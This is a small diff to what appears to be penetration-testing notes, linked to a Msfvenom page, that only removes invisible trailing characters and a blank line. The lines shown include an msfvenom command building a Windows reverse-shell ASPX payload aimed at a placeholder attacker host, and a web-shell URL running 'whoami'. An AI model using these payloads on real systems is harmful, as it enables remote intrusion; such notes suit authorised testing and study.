@@ -461,9 +461,8 @@ http://target/shell.aspx?cmd=whoami
 - 関連ノート：[[☠️Msfvenom]]
 
 ```sh
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f aspx -o reverse.aspx​​
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f aspx -o reverse.aspx
 ```
-
 
 ### Identify Target
 
